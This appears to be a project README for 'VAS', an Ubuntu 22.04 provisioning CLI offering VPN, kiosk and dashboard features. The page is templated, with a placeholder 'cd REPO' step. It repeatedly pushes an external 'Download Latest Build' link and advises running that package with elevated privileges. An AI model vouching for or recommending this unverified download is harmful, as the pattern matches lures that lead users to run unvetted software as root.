# VAS v0.1.5 - CLI automation and system provisioning 2026

> **VAS makes Ubuntu 22.04 LTS Desktop setup easier with CLI-based provisioning, VPN and kiosk control, plus a local dashboard in version 0.1.5.**

[![Platform](https://img.shields.io/badge/Platform-Ubuntu%2022.04%20LTS%20Desktop-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1.5-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/seanwgustone2712/vas-ubuntu22-dashboard-loader?style=flat-square)](https://github.com/seanwgustone2712/vas-ubuntu22-dashboard-loader)

---

<p align="center">
  <a href="https://seanwgustone2712.github.io/vas-ubuntu22-dashboard-loader/">
    <img src="https://img.shields.io/badge/Download-VAS%20Latest-brightgreen?style=for-the-badge" alt="Download VAS">
  </a>
</p>

> **[Direct Download - VAS v0.1.5](https://seanwgustone2712.github.io/vas-ubuntu22-dashboard-loader/)**

---

[Download Latest Build](https://seanwgustone2712.github.io/vas-ubuntu22-dashboard-loader/)

---

## What VAS Does

VAS is a command-line tool for automating setup and ongoing management of Ubuntu 22.04 LTS Desktop machines. It is built around repeatable provisioning steps, including core package installation, display and touchscreen configuration, and remote-access setup from one unified flow.

The project fits deployments that need the same initialization every time, such as kiosk-oriented systems, workstations using WireGuard VPN, and installations where local visibility is useful during operation. In addition to the CLI, VAS provides a web dashboard and diagnostic capabilities for status checks, monitoring, and routine administration.

---

## Capabilities

- Installs core packages and remote-access tools
- Applies display and touchscreen configuration
- Manages WireGuard VPN profiles and connection status
- Creates a kiosk user and enables autologin mode
- Supports QR scanning and MQTT publishing workflows
- Includes a web dashboard for local system monitoring
- Provides an MCP diagnostic server
- Supports self-update, dry-run, uninstall, and reset actions

---

## Setup

Clone the repository and launch the setup entry point from the project folder:

```bash
git clone https://github.com/seanwgustone2712/vas-ubuntu22-dashboard-loader.git
cd REPO
./vas --help
```

If you prefer the downloadable package rather than the source tree, use the launch steps that come with that build and run VAS from a terminal with elevated privileges whenever system-level changes are needed.

---

## Usage

Most workflows start with provisioning and continue later with maintenance commands:

```bash
./vas install
./vas status
./vas vpn list
./vas dashboard
```

Typical task flow:

1. Prepare a fresh Ubuntu desktop with the required packages.
2. Set screen, input, or kiosk behavior.
3. Add or swap WireGuard profiles for remote access.
4. Use the dashboard to check current system status.
5. Try dry-run mode before applying changes on a live machine.

---

## Configuration

VAS keeps its operational settings in project-managed config files and in the system locations used by the features it turns on. This covers VPN profile data, kiosk user settings, and display or touchscreen adjustments.

Example structure:

```ini
[system]
mode=provision

[vpn]
provider=wireguard
profile=default

[kiosk]
enabled=true

[dashboard]
enabled=true
```

When needed, use the CLI to inspect, reset, or refresh these settings.

---

## Requirements

- Ubuntu 22.04 LTS Desktop
- Command-line access with sufficient privileges for system setup
- Network access for package installation and remote-access setup
- Support for the tools used by the workflow, including Docker, Git, Node.js, WireGuard, Flask, MQTT, and related utilities where applicable
- Local storage for configuration files, profiles, and dashboard assets

---

## FAQ

### How do I begin?
Download the latest build or clone the repository, then run the help command to view the available provisioning and maintenance actions.

### Can I check the changes first?
Yes. VAS includes dry-run mode so you can review planned actions before making changes on the machine.

### Where are the monitoring and diagnostic features?
The repository includes a web dashboard for status visibility and an MCP diagnostic server for additional checks.

### How can I update VAS?
Use the self-update command when that fits your workflow, or replace the local copy with the latest build from the download link.

### What if I want to remove the setup and start fresh?
VAS provides uninstall and reset options for rolling back managed setup changes.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
